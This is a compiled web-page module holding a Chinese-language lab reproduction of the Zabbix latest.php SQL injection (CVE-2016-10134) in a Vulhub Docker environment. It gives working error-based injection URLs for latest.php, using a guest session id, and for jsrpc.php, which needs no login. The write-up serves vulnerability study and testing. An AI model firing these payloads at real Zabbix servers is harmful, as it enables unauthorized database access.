import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{o as a,c as t,e as i}from"./app-58e4a7d6.js";const o={},d=i(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>zabbix是一款服务器监控软件，其由server、agent、web等模块组成，其中web模块由PHP编写，用来显示数据库中的结果。</p><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub执行如下命令启动zabbix 3.0.3：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>执行命令后，将启动数据库（mysql）、zabbix server、zabbix agent、zabbix web。如果内存稍小，可能会存在某个容器挂掉的情况，我们可以通过<code>docker-compose ps</code>查看容器状态，并通过<code>docker-compose start</code>来重新启动容器。</p><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>访问<code>http://your-ip:8080/index.php</code>，用账号<code>guest</code>（密码为空）登录游客账户。</p><p>登录后，查看Cookie中的<code>zbx_sessionid</code>，复制后16位字符：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>zbx_sessionid=cb4f5e3307ffbca669d1a14be14dc1e0
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203022335590.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>将这16个字符作为sid的值，访问<code>http://your-ip:8080/latest.php?output=ajax&amp;sid=055e1ffa36164a58&amp;favobj=toggle&amp;toggle_open_state=1&amp;toggle_ids[]=updatexml(0,concat(0xa,user()),0)</code>，可见成功注入：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203022338075.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>这个漏洞也可以通过jsrpc.php触发，且无需登录：<code>http://your-ip:8080/jsrpc.php?type=0&amp;mode=1&amp;method=screen.get&amp;profileIdx=web.item.graph&amp;resourcetype=17&amp;profileIdx2=updatexml(0,concat(0xa,user()),0)</code>：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203022338774.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,15),p=[d];function c(r,s){return a(),t("div",null,p)}const b=e(o,[["render",c],["__file","Zabbix latest.php SQL注入漏洞 CVE-2016-10134.html.vue"]]);export{b as default};
